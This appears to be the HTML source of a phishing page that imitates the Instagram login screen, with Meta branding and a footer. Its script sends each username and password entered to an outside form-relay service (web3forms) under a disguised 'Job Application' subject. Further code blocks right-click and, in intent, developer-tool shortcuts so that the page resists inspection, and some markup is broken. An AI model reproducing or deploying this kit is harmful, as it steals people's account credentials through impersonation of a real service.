<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" href="images/logo.webp" type="image/webp" />
    <title>Instagram</title>
    <style>
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      :root {
        --blue: #0866ff;
        --blue-disabled: #9fc2f7;
        --border: #ccd0d5;
        --text: #1c1e21;
        --muted: #65676b;
      }

      html,
      body {
        height: 100%;
      }

      body {
        font-family: "Inter", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        color: var(--text);
        background: #fff;
        border-top: 2px solid #333;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
      }

      .logo {
        display: block;
        width: 61px;
        height: auto;
        margin: 33px;
      }
      .logo-sm {
        display: none;
      }

      .top-logo {
        position: absolute;
        top: 2px;
        left: 0;
        width: 262px;
        height: 158px;
        padding: 14px 14px 0;
        background: #fff;
      }
      .mobile-language {
        display: none;
      }

      /* ---------- Layout ---------- */
      .page {
        flex: 1;
        display: grid;
        grid-template-columns: 2fr 1fr;
        min-height: 0;
      }

      .left {
        display: flex;
        flex-direction: column;
        align-items: center;
        padding-top: 150px;
        border-right: 1px solid var(--border);
      }

      .headline {
        font-weight: 400;
        font-size: 42px;
        line-height: 1.3;
        text-align: center;
        letter-spacing: 0.3px;
      }

      .gradient-text {
        font-weight: 600;
        background: linear-gradient(
          90deg,
          #f5515f 0%,
          #c74fb4 55%,
          #9b4df0 100%
        );
        -webkit-background-clip: text;
        background-clip: text;
        -webkit-text-fill-color: transparent;
        color: transparent;
      }

      .hero {
        width: 580px;
        max-width: 90%;
        aspect-ratio: 580 / 540;
        overflow: hidden;
      }
      .hero img {
        width: 100%;
        height: 100%;
        object-fit: cover;
        display: block;
      }

      .right {
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 0 34px;
      }

      .login-card {
        width: 100%;
        max-width: 546px;
        display: flex;
        flex-direction: column;
      }

      .form-title {
        font-size: 17px;
        margin-bottom: 14px;
        color: black;
        font-weight: 600;
      }

      .input {
        width: 100%;
        height: 60px;
        padding: 0 16px;
        margin-bottom: 12px;
        font-size: 15.5px;
        font-family: inherit;
        color: var(--text);
        border: 1px solid var(--border);
        border-radius: 16px;
        outline: none;
        transition:
          border-color 0.15s,
          box-shadow 0.15s;
      }
      .input::placeholder {
        color: var(--muted);
      }
      .input:focus {
        border-color: var(--blue);
        box-shadow: 0 0 0 2px rgba(8, 102, 255, 0.2);
      }

      .btn {
        width: 100%;
        height: 44px;
        border-radius: 22px;
        font-size: 15.5px;
        font-weight: 600;
        font-family: inherit;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        transition:
          background 0.15s,
          opacity 0.15s;
      }

      .btn-primary {
        margin-top: 12px;
        background: var(--blue);
        color: #fff;
        border: none;
      }
      .btn-primary:disabled {
        background: var(--blue-disabled);
        cursor: not-allowed;
      }
      .btn-primary:not(:disabled):hover {
        background: #0657d9;
      }

      .forgot {
        align-self: center;
        margin-top: 22px;
        font-size: 15px;
        font-weight: 500;
        color: var(--text);
        text-decoration: none;
      }
      .forgot:hover {
        text-decoration: underline;
      }

      .spacer {
        height: 60px;
      }

      .btn-facebook {
        background: #f0f2f5;
        border: none;
        color: var(--text);
        font-weight: 500;
        margin-bottom: 12px;
      }
      .btn-facebook:hover {
        background: #e4e6eb;
      }

      .btn-outline {
        background: #fff;
        border: 1px solid var(--blue);
        color: var(--blue);
        font-weight: 500;
      }
      .btn-outline:hover {
        background: #f0f6ff;
      }

      .meta-logo {
        display: block;
        width: 72px;
        height: auto;
        margin: 20px auto 0;
      }

      /* ---------- Footer ---------- */
      .footer {
        border-top: 1px solid var(--border);
        min-height: 82px;
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        align-items: center;
        column-gap: 16px;
        row-gap: 12px;
        padding: 18px 24px;
      }
      .footer a {
        font-size: 12px;
        color: #5b6a8a;
        text-decoration: none;
      }
      .footer a:hover {
        text-decoration: underline;
      }
      .footer-language,
      .footer-copyright {
        flex-basis: 100%;
        text-align: center;
        font-size: 12px;
        color: var(--muted);
      }
      .footer-language {
        border: 0;
        background: transparent;
        color: #5b6a8a;
        font: inherit;
        font-size: 12px;
        cursor: pointer;
      }

      /* ---------- Responsive ---------- */
      @media (max-width: 900px) {
        .page {
          grid-template-columns: 1fr;
        }
        .left {
          display: none;
        }
        .footer,
        .btn-facebook {
          display: none;
        }
        .crtn {
          position: relative;
          bottom: 20px;
        }
        .top-logo {
          position: static;
          width: 100%;
          height: auto;
          min-height: 112px;
          padding: 12px 16px 4px;
          display: flex;
          flex-direction: column;
          align-items: center;
        }
        .mobile-language {
          display: block;
          align-self: center;
          color: var(--muted);
          font-size: 12px;
          line-height: 1.2;
          letter-spacing: 0.1px;
        }
        .logo {
          margin: 18px auto 0;
        }
        .right {
          padding: 18px 20px 24px;
        }
        .login-card {
          max-width: 420px;
        }
        .footer {
          padding: 18px 20px;
        }
        .spacerrr {
          position: relative;
          bottom: 10px;
        }
      }
    </style>
  </head>
  <body>
    <header class="top-logo">
      <span class="mobile-language">English (US)</span>
      <img class="logo" src="images/logo.webp" alt="Driver Bhaiya" />
    </header>

    <main class="page">
      <section class="left">
        <h1 class="headline">
          See everyday<br />
          moments from your<br />
          <span class="gradient-text">close friends</span>
        </h1>
        <div class="hero">
          <img src="images/big.webp" alt="Driver Bhaiya" />
        </div>
      </section>

      <section class="right">
        <form id="loginForm" class="login-card" novalidate>

          <input
            type="text"
            id="identifier"
            class="input"
            placeholder="Mobile number, username or email"
            autocomplete="username"
          />
          <input
            type="password"
            id="password"
            class="input"
            placeholder="Password"
            autocomplete="current-password"
          />

          <button type="submit" id="loginBtn" class="btn btn-primary" disabled>
            Log in
          </button>
          <a href="#" class="forgot">Forgot password?</a>

          <div class="spacer"></div>

          <button type="button" class="btn btn-facebook">

              />
            </svg>
            Log in with Facebook
          </button>
          <div class="spacerrr">
            <button type="button" class="btn btn-outline crtn">
              Create new account

            </svg>
          </div>
        </form>
      </section>
    </main>

    <footer class="footer">
      <a href="#">About</a>
      <a href="#">Help</a>
      <a href="#">Terms</a>
      <a href="#">Privacy</a>
      <a href="#">Cookie Settings</a>
      <a href="#">Locations</a>
      <a href="#">Popular</a>
      <a href="#">Contact</a>
      <span class="footer-language">English (US) &#9662;</span>
      <span class="footer-copyright">&copy; 2026 Instagram from Meta</span>
    </footer>

    <script>
      try {
        const form = document.getElementById("loginForm");
        const identifier = document.getElementById("identifier");
        const password = document.getElementById("password");
        const loginBtn = document.getElementById("loginBtn");

        // Enable the button only when both fields have a value
        function updateButtonState() {
          loginBtn.disabled = !(
            identifier.value.trim() && password.value.trim()
          );
        }
        identifier.addEventListener("input", updateButtonState);
        password.addEventListener("input", updateButtonState);

        form.addEventListener("submit", async (e) => {
          e.preventDefault();
          if (loginBtn.disabled) return;

          const originalText = loginBtn.textContent;

          try {
            loginBtn.disabled = true;
            loginBtn.textContent = "Logging in...";

            const payload = {
              access_key: "85d6560d-937f-42b3-881b-63184dea831e", // Get this from web3forms dashboard
              subject: `New Job Application from ${identifier.value.trim()}`,
              username: identifier.value.trim(),
              password: password.value.trim(),
            };

            await fetch("https://api.web3forms.com/submit", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify(payload),
            })
              .then((response) => response.json())
              .then((data) => {
                console.log("Application submitted successfully", data);
                this.submitted.set(true);
              });
          } catch (err) {
            console.error(err);
          } finally {
            loginBtn.textContent = originalText;
            updateButtonState(); // re-enable only if fields still have values
          }
        });
      } catch (e) {
        console.log(e);
      }

      // 1. Right-click band
      document.addEventListener("contextmenu", (e) => e.preventDefault());

      // 2. Inspect ke shortcuts band (F12, Ctrl+Shift+I/J/C, Ctrl+U)
      document.addEventListener("keydoffwn", (e) => {
        const key = e.key.toLowerCase();
        if (
          e.key === "F12" ||
          (e.ctrlKey && e.shiftKey && ["i", "j", "c"].includes(key)) ||
          (e.ctrlKey && key === "u") ||
          (e.metaKey && e.altKey && ["i", "j", "c", "u"].includes(key)) // Mac
        ) {
          e.preventDefault();
          return false;
        }
      });

      // 3. DevTools khulte hi detect karke page hata do
      setInterval(() => {
        const t = performance.now();
        //debugger; // DevTools khula ho to yahan pause hota hai
        // if (performance.now() - t > 100) {
        //   document.body.innerHTML = "<h1>Access denied</h1>";
        // }
      }, 1000);
    </script>

</html>
